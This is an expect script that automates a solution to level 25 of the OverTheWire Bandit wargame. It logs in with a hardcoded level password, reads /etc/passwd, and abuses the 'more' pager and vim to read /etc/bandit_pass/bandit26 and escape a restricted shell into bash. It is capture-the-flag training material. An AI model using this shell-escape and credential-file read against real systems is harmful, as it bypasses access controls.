#!/usr/bin/expect -f

#spawns the ssh session and logs in as bandit25
spawn ssh -l bandit25 -p 2220 bandit.labs.overthewire.org

#logs in
expect {
    "*yes/no*" { send "yes\r" ; exp_continue }
    "*assword: " { send "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\r" ; }
}

expect "*\$ "
send "cat /etc/passwd | grep bandit26\r"
expect "*\$ "
send "cat /usr/bin/showtext\r"
expect "*\$ "

#this step requires you to trigger "more" upon login, otherwise it kicks you out
#upon logging in as bandit26
#here, I've created another session (tmux) in the same window and adjusted its size
send "tmux\r"
sleep .5
send "resize-pane -D 60\r"
sleep .5

#login as bandit26
send "ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost\r"
expect "*\$ "
#the following utilizes vim commands to access the password file
send "v"
sleep .5
send ":e /etc/bandit_pass/bandit26"
sleep 2
send ":set shell=/bin/bash\r"
sleep .5
send ":shell\r"